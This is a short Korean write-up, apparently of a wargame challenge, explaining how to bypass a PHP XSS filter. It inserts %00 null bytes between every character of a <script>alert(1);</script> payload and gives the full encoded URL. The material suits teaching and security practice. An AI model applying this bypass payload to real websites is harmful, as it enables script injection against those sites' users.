# php-filtering-bypass

인풋을 받는 곳이 있다. 
미션은 여기에 `<script>alert(1);</script>` 를 삽입하는 것.

그냥 넣으면 당연히 필터링에 걸리면서 `no hack` 문구가 뜬다. 

url에 입력내용이 들어간다. 
url encoding을 이용하면 된다.

`%00` 는 url 퍼센트 인코딩에서 `null` 을 나타낸다. 
즉, 저 값은 넣어도 실제로는 아무런 의미를 가지지 않지만, 필터링 함수는 문자로 인식하면서 우회가 가능하다. 

문자가 연속으로 오면 전부 필터링이 되기에 
문자 사이사이에 저 null문자를 다 넣어준다. 

```html
index.php?code=<script>alert(1);</script>  이거를 아래와 같이 바꿔서 넣음.
```

```
index.php?code=%00%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00(%001%00)%00;%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00
```

- [url 퍼센트 인코딩]([https://ko.wikipedia.org/wiki/%ED%8D%BC%EC%84%BC%ED%8A%B8_%EC%9D%B8%EC%BD%94%EB%94%A9](https://ko.wikipedia.org/wiki/퍼센트_인코딩))

> 문자열 우회를 하는 방법중.
> url null 인코딩을 이용하는 방법이다. 